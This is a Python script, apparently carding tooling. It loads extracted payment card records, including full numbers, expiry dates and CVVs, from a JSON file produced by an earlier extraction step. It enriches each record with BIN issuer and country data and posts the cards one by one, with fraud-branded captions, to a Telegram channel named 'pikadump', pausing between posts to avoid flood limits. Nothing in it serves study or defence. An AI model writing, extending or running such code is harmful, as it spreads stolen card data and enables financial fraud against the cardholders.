"""
Post Cards to Telegram Channel
Formats and posts extracted cards to a specified channel
"""
import asyncio
import sys
import os
import json
import re
from pathlib import Path

# Fix Windows console encoding
if sys.platform == 'win32':
    os.system('chcp 65001 >nul 2>&1')
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8')

from pyrogram import Client
from pyrogram.enums import ParseMode
from config import API_ID, API_HASH, SESSION_NAME, PHONE_NUMBER
import csv

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Configuration
CHANNEL_USERNAME = "pikadump"  # Channel to post to (without @)
IMAGE_PATH = Path(r"C:\Users\Administrator\Desktop\1769984384062.webp")
CONVERTED_IMAGE = Path("temp_image.jpg")
CARDS_JSON = Path("output/cards.json")
BIN_DATABASE_FILE = Path("bin-list-data.csv")

# Country flag emojis
COUNTRY_FLAGS = {
    "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "DE": "🇩🇪",
    "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "JP": "🇯🇵", "CN": "🇨🇳",
    "IN": "🇮🇳", "BR": "🇧🇷", "MX": "🇲🇽", "RU": "🇷🇺", "KR": "🇰🇷",
    "SG": "🇸🇬", "HK": "🇭🇰", "TW": "🇹🇼", "MY": "🇲🇾", "TH": "🇹🇭",
    "ID": "🇮🇩", "PH": "🇵🇭", "VN": "🇻🇳", "NL": "🇳🇱", "BE": "🇧🇪",
    "CH": "🇨🇭", "AT": "🇦🇹", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰",
    "FI": "🇫🇮", "PL": "🇵🇱", "CZ": "🇨🇿", "PT": "🇵🇹", "GR": "🇬🇷",
    "TR": "🇹🇷", "AE": "🇦🇪", "SA": "🇸🇦", "IL": "🇮🇱", "ZA": "🇿🇦",
    "NG": "🇳🇬", "EG": "🇪🇬", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴",
    "NZ": "🇳🇿", "IE": "🇮🇪", "PK": "🇵🇰", "BD": "🇧🇩", "UA": "🇺🇦",
}

# Load BIN database into memory
BIN_DB = {}

def load_bin_database():
    """Load BIN database from CSV file"""
    global BIN_DB
    if not BIN_DATABASE_FILE.exists():
        print(f"[!] BIN database not found: {BIN_DATABASE_FILE}")
        return
    
    try:
        with open(BIN_DATABASE_FILE, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                bin_num = row.get('BIN', '').strip()
                if bin_num:
                    BIN_DB[bin_num] = {
                        'brand': row.get('Brand', 'UNKNOWN').upper(),
                        'type': row.get('Type', 'CREDIT').upper(),
                        'category': row.get('Category', 'STANDARD').upper() or 'STANDARD',
                        'issuer': row.get('Issuer', 'UNKNOWN BANK').upper(),
                        'country': row.get('isoCode2', 'XX'),
                        'country_name': row.get('CountryName', 'UNKNOWN'),
                    }
        print(f"[OK] Loaded {len(BIN_DB)} BINs from database")
    except Exception as e:
        print(f"[X] Error loading BIN database: {e}")


def convert_webp_to_jpg(webp_path: Path, jpg_path: Path) -> bool:
    """Convert webp image to jpg"""
    if not PIL_AVAILABLE:
        print("[!] Pillow not installed, cannot convert image")
        return False
    
    try:
        img = Image.open(webp_path)
        # Convert to RGB if necessary (for transparency)
        if img.mode in ('RGBA', 'LA', 'P'):
            img = img.convert('RGB')
        img.save(jpg_path, 'JPEG', quality=95)
        return True
    except Exception as e:
        print(f"[X] Error converting image: {e}")
        return False

def get_bin_info(card_number: str) -> dict:
    """Get BIN info from card number using loaded database"""
    bin_6 = card_number[:6]
    
    # Try exact match first
    if bin_6 in BIN_DB:
        info = BIN_DB[bin_6]
        country = info['country']
        flag = COUNTRY_FLAGS.get(country, "🏳️")
        return {
            "bank": info['issuer'],
            "country": country,
            "flag": flag,
            "type": info['type'],
            "brand": info['brand'],
            "level": info['category']
        }
    
    # Try 8-digit BIN
    bin_8 = card_number[:8]
    if bin_8 in BIN_DB:
        info = BIN_DB[bin_8]
        country = info['country']
        flag = COUNTRY_FLAGS.get(country, "🏳️")
        return {
            "bank": info['issuer'],
            "country": country,
            "flag": flag,
            "type": info['type'],
            "brand": info['brand'],
            "level": info['category']
        }
    
    # Default based on card type detection
    first_digit = card_number[0]
    
    if first_digit == '4':
        return {"bank": "VISA BANK", "country": "US", "flag": "🇺🇸", "type": "CREDIT", "brand": "VISA", "level": "CLASSIC"}
    elif first_digit == '5':
        return {"bank": "MASTERCARD BANK", "country": "US", "flag": "🇺🇸", "type": "CREDIT", "brand": "MASTERCARD", "level": "STANDARD"}
    elif first_digit == '3':
        if len(card_number) > 1 and card_number[1] in ['4', '7']:
            return {"bank": "AMERICAN EXPRESS", "country": "US", "flag": "🇺🇸", "type": "CREDIT", "brand": "AMEX", "level": "GOLD"}
        else:
            return {"bank": "JCB BANK", "country": "JP", "flag": "🇯🇵", "type": "CREDIT", "brand": "JCB", "level": "STANDARD"}
    elif first_digit == '6':
        return {"bank": "DISCOVER BANK", "country": "US", "flag": "🇺🇸", "type": "CREDIT", "brand": "DISCOVER", "level": "STANDARD"}
    
    return {"bank": "UNKNOWN BANK", "country": "XX", "flag": "🏳️", "type": "CREDIT", "brand": "UNKNOWN", "level": "STANDARD"}


def format_card_message(card: dict) -> str:
    """Format card info into message"""
    card_number = card.get('card_number', '')
    month = card.get('expiry_month')
    year = card.get('expiry_year')
    cvv = card.get('cvv', '')
    
    # Get BIN info from local database
    bin_info = get_bin_info(card_number)
    
    bin_6 = card_number[:6]
    
    # Build card line
    if month and year and cvv:
        card_line = f"{card_number}|{month:02d}|{year}|{cvv}"
    elif month and year:
        card_line = f"{card_number}|{month:02d}|{year}"
    else:
        card_line = card_number
    
    # Format message with HTML
    message = f"""Pika Fined Cashtho ~ʕ⁠っ⁠•⁠ᴥ⁠•⁠ʔ⁠っ

<b>{bin_info['brand']} • {bin_info['type']} • {bin_info['level']}</b>

<code>{card_line}</code>

{bin_info['bank']} | {bin_info['country']} {bin_info['flag']}
BIN: {bin_6}

pika father @kokakeki"""
    
    return message



async def main():
    print("\n" + "=" * 60)
    print("   Post Cards to Telegram Channel")
    print("=" * 60)
    
    # Load BIN database
    load_bin_database()
    
    # Check if cards.json exists
    if not CARDS_JSON.exists():
        print(f"[X] Cards file not found: {CARDS_JSON}")
        print("[!] Run check_last_messages.py first to extract cards.")
        return
    
    # Load cards
    with open(CARDS_JSON, 'r', encoding='utf-8') as f:
        cards = json.load(f)
    
    if not cards:
        print("[X] No cards found in cards.json")
        return
    
    print(f"[OK] Loaded {len(cards)} cards")
    
    # Check and convert image
    use_image = False
    if IMAGE_PATH.exists():
        print(f"[OK] Image found: {IMAGE_PATH}")
        # Convert webp to jpg
        if IMAGE_PATH.suffix.lower() == '.webp':
            print("[+] Converting webp to jpg...")
            if convert_webp_to_jpg(IMAGE_PATH, CONVERTED_IMAGE):
                print("[OK] Image converted successfully")
                use_image = True
            else:
                print("[!] Could not convert image, will post without image")
        else:
            use_image = True
    else:
        print(f"[!] Image not found: {IMAGE_PATH}")
        print("[!] Will post without image")
    
    # Initialize client
    client = Client(
        SESSION_NAME,
        api_id=int(API_ID),
        api_hash=API_HASH,
        phone_number=PHONE_NUMBER if PHONE_NUMBER else None
    )
    
    try:
        await client.start()
        me = await client.get_me()
        print(f"[OK] Logged in as: {me.first_name}")
        
        # Post each card
        posted = 0
        for i, card in enumerate(cards):
            try:
                # Format message
                message = format_card_message(card)
                
                print(f"\n[{i+1}/{len(cards)}] Posting card: {card.get('card_number', 'N/A')[:6]}******")
                
                # Send with or without image
                if use_image and CONVERTED_IMAGE.exists():
                    await client.send_photo(
                        chat_id=f"@{CHANNEL_USERNAME}",
                        photo=str(CONVERTED_IMAGE),
                        caption=message,
                        parse_mode=ParseMode.HTML
                    )
                elif use_image and IMAGE_PATH.exists() and IMAGE_PATH.suffix.lower() != '.webp':
                    await client.send_photo(
                        chat_id=f"@{CHANNEL_USERNAME}",
                        photo=str(IMAGE_PATH),
                        caption=message,
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await client.send_message(
                        chat_id=f"@{CHANNEL_USERNAME}",
                        text=message,
                        parse_mode=ParseMode.HTML
                    )
                
                posted += 1
                print(f"[OK] Posted successfully!")
                
                # Delay between posts to avoid flood
                await asyncio.sleep(3)
                
            except Exception as e:
                print(f"[X] Error posting card: {e}")
                continue
        
        print(f"\n" + "=" * 60)
        print(f"   Posted {posted}/{len(cards)} cards to @{CHANNEL_USERNAME}")
        print("=" * 60)
        
    except Exception as e:
        print(f"[X] Error: {e}")
    finally:
        await client.stop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[OK] Cancelled.")
        sys.exit(0)
